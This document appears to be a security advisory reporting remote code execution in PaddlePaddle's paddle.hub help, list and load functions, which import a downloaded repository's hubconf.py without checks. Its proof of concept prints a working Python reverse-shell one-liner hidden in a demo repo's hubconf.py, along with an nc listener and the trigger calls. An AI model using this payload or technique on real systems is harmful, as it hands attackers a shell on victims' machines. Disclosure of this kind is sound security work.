# Description

`Paddle/python/paddle/hapi/hub.py`  allowed users to check or load repositories from remote sources such as `GitHub`, `Gitee`, or a `local` directory. The process involves downloading the repository and then loading it through the internal method `_import_module(name, repo_dir)` . This method relies on the built-in Python function `__import__(name)` to dynamically import the specified module. Nevertheless, `__import__` a remote file without any sanitization or warnings can cause directly Command Execution due to Python functionalities; In this case, specified module `.py` file will be loaded, However, `hubconf.py` will also be loaded via `__import__`.

 # Proof of Concept

In `Paddle/python/paddle/hapi/hub.py`, users are allowed to check or load remote repository via `github`,`gitee` or `local`

* `paddle.hub.help(`
* `paddle.hub.list(`
* `paddle.hub.load(`

all these method are depended method `_import_module` :

```python
def _import_module(name, repo_dir):
    sys.path.insert(0, repo_dir)
    try:
        hub_module = __import__(name)
        sys.modules.pop(name)
    except ImportError:
        sys.path.remove(repo_dir)
        raise RuntimeError(
            'Please make sure config exists or repo error messages above fixed when importing'
        )

    sys.path.remove(repo_dir)

    return hub_module
```

However, all remote packages are directly imported via `hub_module = __import__(name)`. However, due to Python functionalities, using `__import__` will execute all non-indent codes (Or Top-level codes). Resulting execution regardless if the specified `method` or `class` is functional or implementing is functional or implemented at all. This leads to directly RCE even in situations or scenarios that implemented code is intended to `listing available entry points` in the `github hubconf` or even trying to `Show help information of model` even when importing it is not intend.

### `paddle.hub.list(`

`Paddle/python/paddle/hapi/hub.py` -> `list`

```python
def list(repo_dir, source='github', force_reload=False):
    r"""
    List all entrypoints available in `github` hubconf.

    Args:
        repo_dir(str): Github or local path.

            - github path (str): A string with format "repo_owner/repo_name[:tag_name]" with an optional
              tag/branch. The default branch is `main` if not specified.
            - local path (str): Local repo path.

        source (str): `github` | `gitee` | `local`. Default is `github`.
        force_reload (bool, optional): Whether to discard the existing cache and force a fresh download. Default is `False`.

    Returns:
        entrypoints: A list of available entrypoint names.

    Examples:
        .. code-block:: python

            >>> import paddle

            >>> paddle.hub.list('lyuwenyu/paddlehub_demo:main', source='github', force_reload=False)

    """
    if source not in ('github', 'gitee', 'local'):
        raise ValueError(
            f'Unknown source: "{source}". Allowed values: "github" | "gitee" | "local".'
        )

    if source in ('github', 'gitee'):
        repo_dir = _get_cache_or_reload(
            repo_dir, force_reload, True, source=source
        )

    hub_module = _import_module(MODULE_HUBCONF.split('.')[0], repo_dir)

    entrypoints = [
        f
        for f in dir(hub_module)
        if callable(getattr(hub_module, f)) and not f.startswith('_')
    ]

    return entrypoints
```

Similar to `paddle.hub.help`, it validates the `source` parameter.  For 'github' or 'gitee' sources, it uses `_get_cache_or_reload` to manage the cache in the same way as `paddle.hub.help`. Then it calls `_import_module` to import the `MODULE_HUBCONF` file from the repository directory. After that: It then lists all callable entries in the imported module that do not start with an underscore. These are the available models or functions that can be loaded from the repository.

### `paddle.hub.help(`

```python
def help(repo_dir, model, source='github', force_reload=False):
    """
    Show help information of model

    Args:
        repo_dir(str): Github or local path.

            - github path (str): A string with format "repo_owner/repo_name[:tag_name]" with an optional
              tag/branch. The default branch is `main` if not specified.
            - local path (str): Local repo path.

        model (str): Model name.
        source (str): `github` | `gitee` | `local`. Default is `github`.
        force_reload (bool, optional): Default is `False`.

    Returns:
        docs

    Examples:
        .. code-block:: python

            >>> import paddle

            >>> paddle.hub.help('lyuwenyu/paddlehub_demo:main', model='MM', source='github')

    """
    if source not in ('github', 'gitee', 'local'):
        raise ValueError(
            f'Unknown source: "{source}". Allowed values: "github" | "gitee" | "local".'
        )

    if source in ('github', 'gitee'):
        repo_dir = _get_cache_or_reload(
            repo_dir, force_reload, True, source=source
        )

    hub_module = _import_module(MODULE_HUBCONF.split('.')[0], repo_dir)

    entry = _load_entry_from_hubconf(hub_module, model)

    return entry.__doc__
```

It first checks if the `source` parameter is one of the allowed values: `'github', 'gitee', or 'local'`. If not, it raises a `ValueError`. If the source is `'github' or 'gitee'`, the function calls `_get_cache_or_reload` to either retrieve the repository directory from the cache or download and extract the repository if it's not cached or if `force_reload` is `True`. After that, it calls `_import_module` with the `MODULE_HUBCONF` (which is typically set to 'hubconf.py') and the repository directory. This function adds the repository directory to the system path, imports the module named `MODULE_HUBCONF` (without the `.py`), then removes the repository directory from the system path to avoid conflicts. Once the module is imported, `paddle.hub.help` uses `_load_entry_from_hubconf` to retrieve the entry (function or model) by its name from the imported module. Finally, it returns the `__doc__` string of the retrieved entry, which contains the help information or documentation for the model.

### `paddle.hub.load(`

```python
def load(repo_dir, model, source='github', force_reload=False, **kwargs):
    """
    Load model

    Args:
        repo_dir(str): Github or local path.

            - github path (str): A string with format "repo_owner/repo_name[:tag_name]" with an optional
              tag/branch. The default branch is `main` if not specified.
            - local path (str): Local repo path.

        model (str): Model name.
        source (str): `github` | `gitee` | `local`. Default is `github`.
        force_reload (bool, optional): Default is `False`.
        **kwargs: Parameters using for model.

    Returns:
        paddle model.

    Examples:
        .. code-block:: python

            >>> import paddle
            >>> paddle.hub.load('lyuwenyu/paddlehub_demo:main', model='MM', source='github')

    """
    if source not in ('github', 'gitee', 'local'):
        raise ValueError(
            f'Unknown source: "{source}". Allowed values: "github" | "gitee" | "local".'
        )

    if source in ('github', 'gitee'):
        repo_dir = _get_cache_or_reload(
            repo_dir, force_reload, True, source=source
        )

    hub_module = _import_module(MODULE_HUBCONF.split('.')[0], repo_dir)

    _check_dependencies(hub_module)

    entry = _load_entry_from_hubconf(hub_module, model)

    return entry(**kwargs)
```

It firstly validates the `source` parameter just like the other two functions, then it uses `_get_cache_or_reload` to handle the repository cache or download and Imports the `MODULE_HUBCONF` module using `_import_module`. Furthermore,  before attempting to load the model, it checks for any declared dependencies in the imported module using `_check_dependencies`. If any dependencies are missing, it raises a `RuntimeError`. Lastly, It retrieves the specified model or function from the module using `_load_entry_from_hubconf`.

## Exploiting

In this pre-setting case, I created `https://github.com/retr0reg/Paddle-Lover` in `github` with file

* ### [hubconf.py](https://github.com/retr0reg/Paddle-Lover/blob/main/hubconf.py)

  ```python
  dependencies = ['paddle']
  
  import paddle
  
  
  import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")
  class Retr0reg:
      def __init__(self) -> None:
          pass
  ```

  

* ### [module.py](https://github.com/retr0reg/Paddle-Lover/blob/main/module.py)

  ```python
  import paddle
  import paddle.nn as nn
  import paddle.nn.functional as F
  
  
  
  class MM(nn.Layer):
    def __init__(self, out_channels=8):
        super(MM, self).__init__()
        self.conv = nn.Conv2D(3, out_channels, 3, 2, 1)
  
    def forward(self, x):
      out = self.conv(x)
      out = F.relu(out)
      
      return out
  ```

To noticed that, `module.py` can be any secure Python script with normal functionality. Malicious Codes are only included in `hubconf.py` in this case is not in the regular normal inspection range of user (since the main functionality functions just well), user have no idea that `hubconf.py` will be loaded.



To begin with, setup a `nc` server via 

```shell
nc -lvnp 4444
```

After that, by retrieving `help` information of a remote 

```python
import paddle
# Help informations
paddle.hub.help('retr0reg/Paddle-Lover', model='Retr0REG')
# Listing 
paddle.hub.list('retr0reg/Paddle-Lover')
# Loading directory
paddle.hub.load('retr0reg/Paddle-Lover', model='Retr0REG')
```

Any of these three commands will trigger downloading the specified `retr0reg/Paddle-Lover`, while calling `_import_module` to directly `__import__` them